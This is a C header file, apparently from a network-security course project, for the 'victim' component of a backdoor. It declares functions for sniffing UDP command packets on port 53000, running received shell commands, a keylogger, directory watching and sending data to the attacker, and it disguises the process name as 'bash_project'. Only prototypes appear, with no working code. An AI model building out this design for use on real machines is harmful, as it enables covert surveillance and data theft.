#ifndef COMP8505_PROJECT_VICTIM_H
#define COMP8505_PROJECT_VICTIM_H

#include "common.h"


#define TOK_BUFSIZE 64
#define LSH_TOK_DELIM " \t\r\n\a"

#define FILTER "udp and dst port 53000"
#define TRUE 1
#define FALSE 0
#define MASK "bash_project"


const char *builtin_str[] = {
        "cd",
        "exit"
};

// Function Prototypes
void options_victim_init(struct options_victim *opts);
void pkt_callback(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
void process_ipv4(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
void convert_uint32t_ip_to_str(uint32_t ip_addr, char *ip, char flag);
void extract_instruction(u_char *args);
void execute_instruction(u_char *args);
char **split_line(char *line);
int execute_command(char **command_arr, u_char *args);
int num_builtins(void);
int builtin_cd(char **args);
int builtin_exit(char **args);
int launch(char **command_arr, u_char *args);
void send_to_attacker(u_char *args);
void* activate_keylogger(void* arg);
void* check_directory(void* arg);

int (*builtin_func[]) (char **) = {
        &builtin_cd,
        &builtin_exit
};





#endif //COMP8505_PROJECT_VICTIM_H
